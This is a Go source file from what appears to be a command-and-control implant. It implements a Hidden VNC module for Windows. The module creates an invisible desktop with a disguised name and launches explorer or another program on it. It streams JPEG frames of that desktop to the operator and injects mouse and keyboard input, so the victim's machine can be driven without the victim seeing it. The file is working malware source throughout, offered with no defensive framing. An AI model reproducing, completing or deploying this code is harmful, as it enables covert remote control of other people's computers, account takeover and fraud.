//go:build windows
// +build windows

package commands

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/utils"
	"math/rand"
	"runtime"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// HVNC（Hidden VNC）隐藏桌面实现：
//   - CreateDesktop 在同一交互窗口站内创建不可见桌面
//   - STARTUPINFO.lpDesktop 让目标程序（explorer 或指定应用）运行在隐藏桌面
//   - 采集线程 SetThreadDesktop 后 GDI BitBlt/StretchBlt 抓取隐藏桌面 -> JPEG -> DataProcess(HVNC_FRAME) 推帧
//   - 输入线程 SetThreadDesktop 后 SendInput 注入鼠标/键盘事件
//
// 多会话并存：HvncManager 按 sessionId 管理，互不影响。

const (
	hvncDefaultFPS  = 8
	hvncJPEGQuality = 70
	hvncFrameReply  = 58 // 与 services.HVNC_FRAME 一致（避免循环导入）
)

// hvncDesktopPrefix HVNC 隐藏桌面名前缀（伪装修饰）
var hvncDesktopPrefix = masquerade("HVNC_")

// mouse 输入事件（前端归一化坐标 0-1）
type hvncMouseEvent struct {
	Type   string  `json:"type"`   // mousemove | mousedown | mouseup | wheel
	X      float64 `json:"x"`      // 0-1（相对捕获图像）
	Y      float64 `json:"y"`      // 0-1
	Button int     `json:"button"` // 0=left 1=right 2=middle
	Wheel  int     `json:"wheel"`  // 滚轮增量
}

type hvncKeyEvent struct {
	Type string `json:"type"` // keydown | keyup
	Scan uint32 `json:"scan"` // 键盘 scan code
	Vk   uint32 `json:"vk"`   // 虚拟键码（兜底）
}

type hvncInputPacket struct {
	Mouse []hvncMouseEvent `json:"mouse,omitempty"`
	Keys  []hvncKeyEvent   `json:"keys,omitempty"`
}

// hvncSession 单个隐藏桌面会话
type hvncSession struct {
	SessionID   string
	Desktop     windows.Handle
	deskWnd     uintptr // 隐藏桌面窗口句柄（跨桌面采集/输入定位用）
	procInfo    windows.ProcessInformation
	origDesktop windows.Handle
	stopCh      chan struct{}
	scale       float64 // 采集缩放（0.25-1.0）
	captureW    int
	captureH    int
	lastPosX    float64 // 最近一次鼠标位置（归一化），键盘输入定位用
	lastPosY    float64
	mu          sync.Mutex
	active      bool
}

// HvncManager 多会话管理器
var hvncManager = struct {
	sync.Mutex
	sessions map[string]*hvncSession
}{sessions: make(map[string]*hvncSession)}

// Windows API
var (
	userHVNC              = windows.NewLazyDLL("user32.dll")
	kernel32HVNC          = windows.NewLazyDLL("kernel32.dll")
	gdi32HVNC             = windows.NewLazyDLL("gdi32.dll")
	procCreateDesktop     = userHVNC.NewProc("CreateDesktopW")
	procSetThreadDesktop  = userHVNC.NewProc("SetThreadDesktop")
	procGetThreadDesktop  = userHVNC.NewProc("GetThreadDesktop")
	procGetCurrentThreadID = kernel32HVNC.NewProc("GetCurrentThreadId")
	procCloseDesktop      = userHVNC.NewProc("CloseDesktop")
	procSendInput         = userHVNC.NewProc("SendInput")
	procGetSystemMetricsHVNC = userHVNC.NewProc("GetSystemMetrics")
	procGetDesktopWindow  = userHVNC.NewProc("GetDesktopWindow")
	procSendMessage       = userHVNC.NewProc("SendMessageW")
	procChildWindowFromPointEx = userHVNC.NewProc("ChildWindowFromPointEx")
	procGetWindowRect     = userHVNC.NewProc("GetWindowRect")
)

// currentThreadDesktop 获取当前线程桌面句柄
func currentThreadDesktop() uintptr {
	tid, _, _ := procGetCurrentThreadID.Call(0)
	h, _, _ := procGetThreadDesktop.Call(tid)
	return h
}

// SendInput 相关结构（与 Win32 INPUT 布局一致，x64）
const (
	mouseEventMove        = 0x0001
	mouseEventLeftDown    = 0x0002
	mouseEventLeftUp      = 0x0004
	mouseEventRightDown   = 0x0008
	mouseEventRightUp     = 0x0010
	mouseEventMiddleDown  = 0x0020
	mouseEventMiddleUp    = 0x0040
	mouseEventWheel       = 0x0800
	mouseEventAbsolute    = 0x8000
	keyEventExtendedKey   = 0x0001
	keyEventKeyUp         = 0x0002
	keyEventScanCode      = 0x0008
	inputMouse            = 0
	inputKeyboard         = 1
)

type hvncMouseInput struct {
	Dx          int32
	Dy          int32
	MouseData   uint32
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type hvncKeybdInput struct {
	WVk         uint16
	WScan       uint16
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type hvncInputUnion struct {
	Mi hvncMouseInput
	Ki hvncKeybdInput
}

type hvncInput struct {
	Type  uint32
	Union hvncInputUnion
}

// StartHvnc 启动 HVNC 会话（隐藏桌面 + 目标程序 + 采集循环）
// payload: [4B sidLen][sessionId][4B appLen][app][4B argsLen][args]（app 为空 = explorer）
func StartHvnc(cmdBuf []byte) ([]byte, error) {
	var sid, app, args string
	if err := parseHvncStartPayload(cmdBuf, &sid, &app, &args); err != nil {
		return nil, err
	}

	hvncManager.Lock()
	if _, exists := hvncManager.sessions[sid]; exists {
		hvncManager.Unlock()
		return nil, errors.New("HVNC 会话已存在: " + sid)
	}
	hvncManager.Unlock()

	// 1. 创建隐藏桌面
	desktopName := fmt.Sprintf("%s%s%06d", hvncDesktopPrefix, sid, rand.Intn(1000000))
	desktopNamePtr, _ := windows.UTF16PtrFromString(desktopName)
	r1, _, _ := procCreateDesktop.Call(
		uintptr(unsafe.Pointer(desktopNamePtr)),
		0, 0, 0,
		uintptr(0x10000000), // GENERIC_ALL
		0,
	)
	if r1 == 0 {
		return nil, errors.New("CreateDesktop 失败")
	}
	desktop := windows.Handle(r1)

	// 2. 保存原始桌面并切换（本线程，用于取隐藏桌面窗口句柄 + 启动目标程序）
	orig := currentThreadDesktop()
	if orig != 0 {
		procSetThreadDesktop.Call(uintptr(desktop))
	}
	// 隐藏桌面窗口句柄（GetDesktopWindow 返回调用线程桌面的桌面窗口）
	hiddenDeskWnd, _, _ := procGetDesktopWindow.Call(0)

	// 3. 在隐藏桌面启动目标程序
	procInfo, err := startProcessOnDesktop(desktopName, app, args)
	if err != nil {
		procSetThreadDesktop.Call(orig)
		procCloseDesktop.Call(uintptr(desktop))
		return nil, fmt.Errorf("在隐藏桌面启动程序失败: %v", err)
	}

	// 4. 恢复线程桌面
	procSetThreadDesktop.Call(orig)

	// 5. 获取虚拟屏幕尺寸作为初始捕获尺寸
	vw, _, _ := procGetSystemMetricsHVNC.Call(78) // SM_CXVIRTUALSCREEN
	vh, _, _ := procGetSystemMetricsHVNC.Call(79) // SM_CYVIRTUALSCREEN

	session := &hvncSession{
		SessionID:   sid,
		Desktop:     desktop,
		deskWnd:     hiddenDeskWnd,
		procInfo:    procInfo,
		origDesktop: windows.Handle(orig),
		stopCh:      make(chan struct{}),
		scale:       1.0,
		captureW:    int(vw),
		captureH:    int(vh),
		active:      true,
	}

	hvncManager.Lock()
	hvncManager.sessions[sid] = session
	hvncManager.Unlock()

	// 6. 启动采集循环（线程保持输入桌面，跨桌面采集隐藏桌面窗口 DC）
	go session.captureLoop()

	communication.DataProcess(0, []byte(fmt.Sprintf("[*] HVNC 会话 %s 已启动（桌面 %s，程序 %s）", sid, desktopName, appNameOrExplorer(app))))
	return []byte(fmt.Sprintf("[✓] HVNC session %s started (desktop: %s)", sid, desktopName)), nil
}

func appNameOrExplorer(app string) string {
	if app == "" {
		return "explorer.exe"
	}
	return app
}

// parseHvncStartPayload 解析 [sid][app][args]
func parseHvncStartPayload(data []byte, sid, app, args *string) error {
	offset := 0
	readStr := func() (string, error) {
		if offset+4 > len(data) {
			return "", errors.New("HVNC payload 长度不足")
		}
		l := int(binary.BigEndian.Uint32(data[offset : offset+4]))
		offset += 4
		if offset+l > len(data) {
			return "", errors.New("HVNC payload 长度不足")
		}
		s := string(data[offset : offset+l])
		offset += l
		return s, nil
	}
	s, err := readStr()
	if err != nil {
		return err
	}
	a, err := readStr()
	if err != nil {
		return err
	}
	g, err := readStr()
	if err != nil {
		return err
	}
	*sid, *app, *args = s, a, g
	return nil
}

// startProcessOnDesktop 在指定桌面创建进程
func startProcessOnDesktop(desktopName, app, args string) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation
	if app == "" {
		app = "explorer.exe"
	}
	// 【修复】仅引号包裹程序路径（路径含空格时 CreateProcess 无引号启动失败；
	// 不能包裹整个命令串，否则 args 会被当作路径的一部分）
	cmdline := `"` + app + `"`
	if args != "" {
		cmdline = cmdline + " " + args
	}
	cmdPtr, _ := windows.UTF16PtrFromString(cmdline)
	deskPtr, _ := windows.UTF16PtrFromString(desktopName)

	si := windows.StartupInfo{
		Cb:         uint32(unsafe.Sizeof(windows.StartupInfo{})),
		Desktop:    deskPtr,
		Flags:      0,
	}
	err := windows.CreateProcess(
		nil, cmdPtr, nil, nil, false,
		0, nil, nil, &si, &pi,
	)
	return pi, err
}

// StopHvnc 停止 HVNC 会话
// payload: [sessionId]
func StopHvnc(cmdBuf []byte) ([]byte, error) {
	sid := string(cmdBuf)
	hvncManager.Lock()
	session, exists := hvncManager.sessions[sid]
	if exists {
		delete(hvncManager.sessions, sid)
	}
	hvncManager.Unlock()

	if !exists || session == nil {
		return []byte("[!] HVNC 会话不存在: " + sid), nil
	}

	session.mu.Lock()
	session.active = false
	close(session.stopCh)
	// 结束目标进程
	if session.procInfo.Process != 0 {
		windows.TerminateProcess(session.procInfo.Process, 0)
		windows.CloseHandle(session.procInfo.Process)
		windows.CloseHandle(session.procInfo.Thread)
		session.procInfo.Process = 0
	}
	session.mu.Unlock()

	// 恢复线程桌面后关闭桌面
	if session.origDesktop != 0 {
		procSetThreadDesktop.Call(uintptr(session.origDesktop))
	}
	if session.Desktop != 0 {
		procCloseDesktop.Call(uintptr(session.Desktop))
	}

	communication.DataProcess(0, []byte(fmt.Sprintf("[*] HVNC 会话 %s 已停止", sid)))
	return []byte("[✓] HVNC session stopped: " + sid), nil
}

// SendHvncInput 注入 HVNC 输入事件（鼠标/键盘/缩放控制）
// payload: \x01 + JSON => 缩放控制 {"scale":0.5}；否则为输入事件 JSON
func SendHvncInput(cmdBuf []byte) ([]byte, error) {
	// [4B sidLen][sid][payload]
	if len(cmdBuf) < 4 {
		return nil, errors.New("HVNC input payload 过短")
	}
	sidLen := int(binary.BigEndian.Uint32(cmdBuf[:4]))
	if 4+sidLen > len(cmdBuf) {
		return nil, errors.New("HVNC input payload 长度不足")
	}
	sid := string(cmdBuf[4 : 4+sidLen])
	payload := cmdBuf[4+sidLen:]

	hvncManager.Lock()
	session, exists := hvncManager.sessions[sid]
	hvncManager.Unlock()
	if !exists || session == nil {
		return nil, errors.New("HVNC 会话不存在: " + sid)
	}

	// 控制消息：缩放
	if len(payload) > 0 && payload[0] == '\x01' {
		var ctrl struct {
			Scale float64 `json:"scale"`
		}
		if err := json.Unmarshal(payload[1:], &ctrl); err == nil && ctrl.Scale > 0.1 && ctrl.Scale <= 1.0 {
			session.mu.Lock()
			session.scale = ctrl.Scale
			session.mu.Unlock()
			return []byte(fmt.Sprintf("[✓] HVNC scale set to %.2f", ctrl.Scale)), nil
		}
		return []byte("[!] invalid scale payload"), nil
	}

	var pkt hvncInputPacket
	if err := json.Unmarshal(payload, &pkt); err != nil {
		return nil, fmt.Errorf("HVNC input JSON 解析失败: %v", err)
	}

	if len(pkt.Mouse) == 0 && len(pkt.Keys) == 0 {
		return nil, nil
	}

	// 注入输入：锁定线程保证 SetThreadDesktop 与 SendInput 在同一 OS 线程
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procSetThreadDesktop.Call(uintptr(session.Desktop))
	defer procSetThreadDesktop.Call(uintptr(session.origDesktop))

	// 计算绝对坐标映射（虚拟屏幕）
	vx, _, _ := procGetSystemMetricsHVNC.Call(76) // SM_XVIRTUALSCREEN
	vy, _, _ := procGetSystemMetricsHVNC.Call(77)
	vw, _, _ := procGetSystemMetricsHVNC.Call(78)
	vh, _, _ := procGetSystemMetricsHVNC.Call(79)
	vwI, vhI := int(vw), int(vh)
	if vwI <= 0 || vhI <= 0 {
		return nil, errors.New("无法获取虚拟屏幕尺寸")
	}

	inputs := make([]hvncInput, 0, len(pkt.Mouse)+len(pkt.Keys))
	for _, m := range pkt.Mouse {
		// 归一化坐标 -> 像素 -> 绝对 0-65535
		px := int(m.X * float64(session.captureW))
		py := int(m.Y * float64(session.captureH))
		absX := int32((px + int(vx)) * 65535 / (vwI - 1))
		absY := int32((py + int(vy)) * 65535 / (vhI - 1))

		flags := uint32(mouseEventAbsolute | mouseEventMove)
		switch m.Type {
		case "mousedown":
			switch m.Button {
			case 1:
				flags |= mouseEventRightDown
			case 2:
				flags |= mouseEventMiddleDown
			default:
				flags |= mouseEventLeftDown
			}
		case "mouseup":
			switch m.Button {
			case 1:
				flags |= mouseEventRightUp
			case 2:
				flags |= mouseEventMiddleUp
			default:
				flags |= mouseEventLeftUp
			}
		case "wheel":
			flags = mouseEventWheel
		}
		in := hvncInput{Type: inputMouse}
		in.Union.Mi = hvncMouseInput{Dx: absX, Dy: absY, MouseData: uint32(m.Wheel), DwFlags: flags}
		inputs = append(inputs, in)
	}
	for _, k := range pkt.Keys {
		flags := uint32(keyEventScanCode)
		if k.Type == "keyup" {
			flags |= keyEventKeyUp
		}
		// 扩展键（方向键/Home/End/Insert/Delete/PgUp/PgDn/右侧 Ctrl/Alt 等）需要 EXTENDEDKEY 标志
		if k.Scan > 0 && isExtendedScanCode(uint16(k.Scan)) {
			flags |= keyEventExtendedKey
		}
		in := hvncInput{Type: inputKeyboard}
		in.Union.Ki = hvncKeybdInput{WVk: uint16(k.Vk), WScan: uint16(k.Scan), DwFlags: flags}
		inputs = append(inputs, in)
	}

	if len(inputs) == 0 {
		return nil, nil
	}
	r1, _, _ := procSendInput.Call(
		uintptr(len(inputs)),
		uintptr(unsafe.Pointer(&inputs[0])),
		unsafe.Sizeof(hvncInput{}),
	)
	if r1 > 0 {
		return []byte(fmt.Sprintf("[+] %d input events injected via SendInput", r1)), nil
	}

	// SendInput 失败（非输入桌面常见）→ 回退 SendMessage 注入（跨桌面可用，无需切换线程桌面）
	return session.injectViaSendMessage(pkt)
}

// injectViaSendMessage 通过 SendMessage 向隐藏桌面窗口注入鼠标/键盘事件
// （消息直接送达窗口过程，无需目标桌面输入队列，跨桌面有效）
func (s *hvncSession) injectViaSendMessage(pkt hvncInputPacket) ([]byte, error) {
	if s.deskWnd == 0 {
		return nil, errors.New("隐藏桌面窗口句柄无效")
	}

	vx, _, _ := procGetSystemMetricsHVNC.Call(76)
	vy, _, _ := procGetSystemMetricsHVNC.Call(77)
	vw, _, _ := procGetSystemMetricsHVNC.Call(78)
	vh, _, _ := procGetSystemMetricsHVNC.Call(79)
	vwI, vhI := int(int32(vw)), int(int32(vh))
	if vwI <= 0 || vhI <= 0 {
		return nil, errors.New("无法获取虚拟屏幕尺寸")
	}

	injected := 0
	for _, m := range pkt.Mouse {
		px := int(m.X * float64(s.captureW))
		py := int(m.Y * float64(s.captureH))
		sx := px + int(int32(vx))
		sy := py + int(int32(vy))
		s.mu.Lock()
		s.lastPosX, s.lastPosY = m.X, m.Y
		s.mu.Unlock()

		// 命中测试：隐藏桌面窗口下该点的子窗口
		pt := uintptr(uint32(uint16(sx)) | (uint32(uint16(sy)) << 16))
		hWnd, _, _ := procChildWindowFromPointEx.Call(s.deskWnd, pt, 0 /*CWP_ALL*/)
		if hWnd == 0 {
			hWnd = s.deskWnd
		}
		clientPt := s.screenToClient(hWnd, sx, sy)
		lParam := uintptr(uint32(uint16(clientPt[0])) | (uint32(uint16(clientPt[1])) << 16))

		var msg uint32
		var wParam uintptr
		switch m.Type {
		case "mousemove":
			msg = 0x0200 // WM_MOUSEMOVE
		case "mousedown":
			switch m.Button {
			case 1:
				msg, wParam = 0x0204, 2 // WM_RBUTTONDOWN
			case 2:
				msg, wParam = 0x0207, 16 // WM_MBUTTONDOWN
			default:
				msg, wParam = 0x0201, 1 // WM_LBUTTONDOWN
			}
		case "mouseup":
			switch m.Button {
			case 1:
				msg, wParam = 0x0205, 2 // WM_RBUTTONUP
			case 2:
				msg, wParam = 0x0208, 16 // WM_MBUTTONUP
			default:
				msg, wParam = 0x0202, 1 // WM_LBUTTONUP
			}
		case "wheel":
			msg = 0x020A // WM_MOUSEWHEEL
			wParam = uintptr(uint32(uint16(m.Wheel)) << 16)
		default:
			continue
		}
		procSendMessage.Call(hWnd, uintptr(msg), wParam, lParam)
		injected++
	}

	for _, k := range pkt.Keys {
		// 定位目标：最近鼠标位置下的窗口；无则桌面窗口
		s.mu.Lock()
		lx, ly := s.lastPosX, s.lastPosY
		s.mu.Unlock()
		hWnd := s.deskWnd
		if lx > 0 || ly > 0 {
			px := int(lx * float64(s.captureW))
			py := int(ly * float64(s.captureH))
			pt := uintptr(uint32(uint16(px+int(int32(vx)))) | (uint32(uint16(py+int(int32(vy)))) << 16))
			if w, _, _ := procChildWindowFromPointEx.Call(s.deskWnd, pt, 0); w != 0 {
				hWnd = w
			}
		}
		// lParam: repeat=1 | scan<<16 | extended<<24 | keyup(bit31|bit30)
		lParam := uintptr(1 | (uint32(k.Scan) << 16))
		if k.Scan > 0 && isExtendedScanCode(uint16(k.Scan)) {
			lParam |= 0x1000000
		}
		msg := uint32(0x0100) // WM_KEYDOWN
		if k.Type == "keyup" {
			msg = 0x0101 // WM_KEYUP
			lParam |= 0xC0000000
		}
		procSendMessage.Call(hWnd, uintptr(msg), uintptr(k.Vk), lParam)
		injected++
	}

	return []byte(fmt.Sprintf("[+] %d input events injected via SendMessage", injected)), nil
}

// screenToClient 屏幕坐标转窗口客户区坐标（跨桌面可用）
func (s *hvncSession) screenToClient(hWnd uintptr, sx, sy int) [2]int {
	var rect struct{ Left, Top, Right, Bottom int32 }
	procGetWindowRect.Call(hWnd, uintptr(unsafe.Pointer(&rect)))
	return [2]int{sx - int(rect.Left), sy - int(rect.Top)}
}

// isExtendedScanCode 判断是否为需要 KEYEVENTF_EXTENDEDKEY 的扩展键 scan code
func isExtendedScanCode(scan uint16) bool {
	switch scan {
	case 0x1C, 0x1D, 0x35, 0x37, 0x38, // 数字键盘 Enter、右 Ctrl、数字键盘 /、PrtSc、右 Alt
		0x47, 0x48, 0x49, 0x4B, 0x4D, 0x4F, 0x50, 0x51, 0x52, 0x53: // Home/↑/PgUp/←/→/End/↓/PgDn/Ins/Del
		return true
	}
	return false
}

// captureLoop 采集循环：线程保持输入桌面，跨桌面采集隐藏桌面窗口 DC
// （实测：隐藏桌面线程上 GDI 采集/BitBlt/SendInput 均失败；输入桌面线程对隐藏桌面窗口
//   GetDC + BitBlt 与 SendMessage 注入均可用 —— 因此采集/输入都不切换线程桌面）
func (s *hvncSession) captureLoop() {
	// 启动宽限：等待目标程序初始化桌面（首次采集延迟 2 秒）
	time.Sleep(2 * time.Second)

	interval := time.Second / hvncDefaultFPS
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	okLogged := false
	for {
		select {
		case <-s.stopCh:
			return
		case <-ticker.C:
			s.mu.Lock()
			if !s.active {
				s.mu.Unlock()
				return
			}
			scale := s.scale
			s.mu.Unlock()

			frame, capErr := s.captureFrame(scale)
			if frame == nil || capErr != nil {
				debuglog.Printf("❌ [HVNC] captureFrame 失败: %v\n", capErr)
				continue
			}
			if !okLogged {
				debuglog.Printf("🖼️ [HVNC] 采集成功（首帧 %d bytes）\n", len(frame))
				okLogged = true
			}
			sid := []byte(s.SessionID)
			payload := utils.BytesCombine(utils.WriteInt(len(sid)), sid, frame)
			communication.DataProcess(hvncFrameReply, payload)
		}
	}
}

// captureFrame 跨桌面采集隐藏桌面一帧。
// 采集管线与 TakeScreenshot 完全一致（GetDC + CreateCompatibleDC + CreateDIBSection + BitBlt + 直读像素），
// 仅源 DC 换成隐藏桌面窗口 DC（输入桌面线程跨桌面取 DC 可用）；
// 缩放用 Go 侧最近邻降采样，避免任何 GetDIBits/GetDeviceCaps 等不稳定 API。
func (s *hvncSession) captureFrame(scale float64) ([]byte, error) {
	if s.deskWnd == 0 {
		return nil, errors.New("隐藏桌面窗口句柄无效")
	}

	// 隐藏桌面窗口 DC（线程保持在输入桌面，跨桌面取 DC 实测可用）
	screenDC, _, _ := getDC.Call(s.deskWnd)
	if screenDC == 0 {
		return nil, fmt.Errorf("GetDC(隐藏桌面窗口) 失败 deskWnd=%v", s.deskWnd)
	}
	defer releaseDC.Call(s.deskWnd, screenDC)

	// 虚拟屏幕（物理像素）
	vx, _, _ := procGetSystemMetricsHVNC.Call(76)
	vy, _, _ := procGetSystemMetricsHVNC.Call(77)
	vw, _, _ := procGetSystemMetricsHVNC.Call(78)
	vh, _, _ := procGetSystemMetricsHVNC.Call(79)
	if vw == 0 || vh == 0 {
		return nil, fmt.Errorf("GetSystemMetrics 虚拟屏幕为 0 (vw=%d vh=%d)", int32(vw), int32(vh))
	}
	width, height := int(int32(vw)), int(int32(vh))
	if width < 2 || height < 2 {
		return nil, fmt.Errorf("屏幕尺寸异常 %dx%d", width, height)
	}

	memoryDC, _, _ := createCompatibleDC.Call(screenDC)
	if memoryDC == 0 {
		return nil, errors.New("CreateCompatibleDC 失败")
	}
	defer deleteDC.Call(memoryDC)

	bmi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(width),
			BiHeight:      -int32(height), // 自上而下
			BiPlanes:      1,
			BiBitCount:    32, // BGRA
			BiCompression: 0,  // BI_RGB
		},
	}
	var bits uintptr
	hBitmap, _, _ := createDIBSection.Call(memoryDC, uintptr(unsafe.Pointer(&bmi)), 0, uintptr(unsafe.Pointer(&bits)), 0, 0)
	if hBitmap == 0 {
		return nil, errors.New("CreateDIBSection 失败")
	}
	defer deleteObject.Call(hBitmap)

	oldBitmap, _, _ := selectObject.Call(memoryDC, hBitmap)
	defer selectObject.Call(memoryDC, oldBitmap)

	const SRCCOPY = 0x00CC0020
	ret, _, _ := bitBlt.Call(
		memoryDC, 0, 0, uintptr(width), uintptr(height),
		screenDC, vx, vy,
		SRCCOPY,
	)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt 失败 (src=%dx%d)", width, height)
	}

	// BGRA -> RGBA（与 TakeScreenshot 相同的直读像素路径）
	imageSize := width * height * 4
	pixelData := (*[1 << 30]byte)(unsafe.Pointer(bits))[:imageSize:imageSize]

	img := image.NewRGBA(image.Rect(0, 0, width, height))
	for y := 0; y < height; y++ {
		row := y * width
		for x := 0; x < width; x++ {
			offset := (row + x) * 4
			pixelIndex := y*img.Stride + x*4
			img.Pix[pixelIndex] = pixelData[offset+2]   // R
			img.Pix[pixelIndex+1] = pixelData[offset+1] // G
			img.Pix[pixelIndex+2] = pixelData[offset]   // B
			img.Pix[pixelIndex+3] = 255
		}
	}

	// 缩放（Go 侧最近邻降采样）
	if scale < 1.0 {
		dstW := int(float64(width) * scale)
		dstH := int(float64(height) * scale)
		if dstW >= 2 && dstH >= 2 {
			img = downscaleNearest(img, dstW, dstH)
		}
	}

	var out bytes.Buffer
	if err := jpeg.Encode(&out, img, &jpeg.Options{Quality: hvncJPEGQuality}); err != nil {
		return nil, fmt.Errorf("JPEG 编码失败: %v", err)
	}
	return out.Bytes(), nil
}

// downscaleNearest 最近邻降采样
func downscaleNearest(src *image.RGBA, dstW, dstH int) *image.RGBA {
	srcW, srcH := src.Bounds().Dx(), src.Bounds().Dy()
	dst := image.NewRGBA(image.Rect(0, 0, dstW, dstH))
	for y := 0; y < dstH; y++ {
		sy := y * srcH / dstH
		for x := 0; x < dstW; x++ {
			sx := x * srcW / dstW
			si := sy*src.Stride + sx*4
			di := y*dst.Stride + x*4
			copy(dst.Pix[di:di+4], src.Pix[si:si+4])
		}
	}
	return dst
}

